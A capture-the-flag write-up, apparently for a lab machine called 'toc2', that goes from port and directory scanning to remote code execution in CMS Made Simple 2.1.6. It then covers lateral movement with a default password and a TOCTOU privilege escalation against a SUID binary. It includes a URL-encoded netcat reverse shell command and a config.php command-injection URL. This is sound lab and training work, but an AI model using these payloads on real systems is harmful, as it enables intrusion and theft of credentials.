## 1. Initial Enumeration
We begin the engagement with an nmap scan to identify open ports and services on the target machine.

The scan reveals two open ports:

* Port 22: SSH
* Port 80: HTTP (Web Server)

![Alt text](/toc2/assets/nmap.png)

## 2. Web Discovery & Directory Bruteforcing
Navigating to the website, we find an "Under Construction" page. While it mentions some potential credentials, their application isn't immediately clear. To uncover hidden paths, I ran gobuster for directory bruteforcing.

![Alt text](/toc2/assets/website_username_pass.png)

![Alt text](/toc2/assets/gobuster.png)

The scan identifies a **robots.txt** file. Inspecting its contents reveals an interesting installation path: 

* **hxxp[://]10.48.164.165/cmsms/cmsms-2.1.6-install.php**

![Alt text](/toc2/assets/robots.png)

## 3. Vulnerability Research
The discovered directory leads to the CMS Made Simple 2.1.6 installation wizard. Researching known vulnerabilities for this version leads to EDB-ID: 44192.

* **hxxps[://]www.exploit-db[.]com/exploits/44192**

The exploit involves Remote Code Execution (RCE) by injecting arbitrary PHP code into the config.php file during the installation process. By providing valid database credentials and injecting code into the timezone parameter during Step 4, we can achieve persistence in the configuration file.

## 4. Exploitation & Initial Access
Using the database credentials found during the installation steps, I injected a PHP system() function into the timezone field.

![Alt text](/toc2/assets/exploit.png)

To verify the exploit, I accessed the newly created config.php with a command parameter

* **hxxp[://]10.48.164.165/cmsms/config.php?cmd=id**

![Alt text](/toc2/assets/id_exploit.png)

## 5. Gaining a Reverse Shell
With RCE confirmed, the next step is to catch a reverse shell. I started a netcat listener on my local machine and executed the following payload via the browser

* **busybox%20nc%2010.48.83.150%204444%20-e%20%2Fbin%2Fbash**

![Alt text](/toc2/assets/reverse_shell.png)

Shell Stabilization
Once connected, I stabilized the shell to allow for better interactivity. I followed the methods outlined in this guide:

* **hxxps[://]infosecwriteups[.]com/how-to-stabilise-a-reverse-shell-using-python-da2f51c42b85**

## 6. Lateral Movement: User Frank
Enumerating the **/home** directory reveals a user named **frank**. We have read access to his home directory.

Inside, we find **user.txt** (the first flag) and a file named **new_machine.txt**. The note explains that Frank was assigned a new Thinkpad and reveals a "default password" used for work machines. Using these credentials, I switched users to Frank

![Alt text](/toc2/assets/frank.png)
![Alt text](/toc2/assets/frank_pass.png)
![Alt text](/toc2/assets/eleavate_frank.png)

## 7. Privilege Escalation: TOCTOU Attack
In Frank's home directory is a folder named root_access containing a SUID binary called **readcreds** and its source code, **readcreds.c**.

The program checks if the user has permission to read a file before opening it. However, this creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. I used the following resources to understand and execute the exploit:

* **Exploit Code: hxxps[://]github[.]com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c**

* **TOCTOU Concepts: hxxps[://]heinosass[.]gitbook[.]io/leet-sheet/binary-exploitation/time-of-check-to-time-of-use-toctou**


![Alt text](/toc2/assets/setup_toctou.png)

By rapidly swapping a file I could read with the root password backup file between the program's "check" and "read" actions, I successfully retrieved the Root Credentials.


![Alt text](/toc2/assets/root_creds.png)

## 8. Final Flag
With the root password, I logged in as root and captured the final flag.


![Alt text](/toc2/assets/roottxt.png)